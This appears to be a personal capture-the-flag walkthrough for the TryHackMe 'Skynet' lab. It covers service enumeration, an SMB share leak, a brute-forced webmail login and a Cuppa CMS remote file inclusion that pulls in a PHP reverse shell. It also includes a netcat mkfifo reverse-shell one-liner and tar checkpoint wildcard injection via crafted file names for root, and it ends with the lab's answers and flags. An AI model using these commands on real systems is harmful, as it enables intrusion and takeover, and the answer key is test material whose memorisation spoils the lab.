#tryhackme #ctf 
# Skynet
---

## Nmap
- 22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
- 80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
- 110/tcp open  pop3        Dovecot pop3d
- 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- 143/tcp open  imap        Dovecot imapd
- 445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

## Gobuster
- /index.html
- /admin
- /css
- /js
- /config
- /ai
- /squirrelmail

## Enum4linux
`enum4linux -a <machine-ip>`
- *Found 2 shares: **anonymous**, **milesdyson** *

## Smbclient
Log into anonymous using smbclient
`smbclient \\\\<ip>\anonymous`

- *Found 1 file: attention.txt*
>All system users are required to change their passwds

- *Found 1 dir: /logs/ with 3 log files:
	- *log1.txt*
	- *log2.txt*
	- *log3.txt*
-   *log2.txt and log3.txt are empty*

Download log1.txt to attacker machine using
`get log1.txt`

Open the file
- *Looks like a passwd list for brute-force*

Password Complexity: Disabled
Minimum Password Length: 5

Visit \<machine-ip>/squirrelmail and go to login.php
Open burpsuite and use username: milesdyson and log1.txt as payload for intruder

- *Found password: **cyborg007haloterminator** *
- *Log in using the found password*

Read email from skynet
- *Found smb password **)s{A&2Z=F^n_E.B** *
`smbclient //<ip>/milesdyson -U milesdyson` 

- *Found /notes/important.txt*

Open the file
- *Found a hint to a web dir: /45kra24zxs28v3yd*
- *Visit the found dir on \<machine-ip>/45kra24zxs28v3yd
- *Found nothing exploitable. Maybe a misdirection*

Running dirb/gobuster/dirsearch on this dir
`dirb http://10.10.185.215/45kra24zxs28v3yd`
- /administrator

Visit \<machine-ip>/45kra24zxs28v3yd/administrator
- *Found cuppa cms*

Search for exploit on cuppa CMS using Searchsploit
`searchsploit cuppa`

- *Found remote file inclusion vulnerability*

Start a local server on attacker machine
`python3 -m http.server 80`

Also start a netcat listener on attacker machine in another terminal:
`nc -lvnp <port>`

Exploit the cuppa vuln:
`curl http://<ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<tun0-ip:port>/php-reverse-shell.php`

- *Gained shell ;)*

Upgrage shell using ([[Linux-PrivEsc#Upgrade Shell]])
`python -c 'import pty;pty.spawn("/bin/bash")'`
`export TERM=xterm`
`stty raw -echo;fg`

Change directory to milesdyson and get the first flag
`cd /home/milesdyson`
`cat user.txt`

- *[FLAG 1]*

- *Found backups/backup.sh in milesdyson's home directory*
`cat /home/milesdyson/backups/backup.sh`

>#!/bin/bash
>cd /var/www/html
>tar cf /home/milesdyson/backups/backup.tgz *

It changes directory into /var/www/html and compresses all the files
This script is run as cronjob by root (Very interesting!)
Change it somehow to escalate privileges ([[Linux-PrivEsc#Cronjobs]])

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ip> <port> >/tmp/f" > shell.sh`
`touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`
`touch "/var/www/html/--checkpoint=1"`

Now wait for cronjob to run
- *Gained root*

`cat /root/root.txt`
- *[FLAG 2]*

---

1. What is Miles password for his emails?
**cyborg007haloterminator**


2. What is the hidden directory?
**/45kra24zxs28v3yd**


3. What is the vulnerability called when you can include a remote file for malicious purposes?
**Remote file inclusion**


4. What is the user flag?
**7ce5c2109a40f958099283600a9ae807**


5. What is the root flag?
**3f0372db24753accc7179a282cd6a949**

---
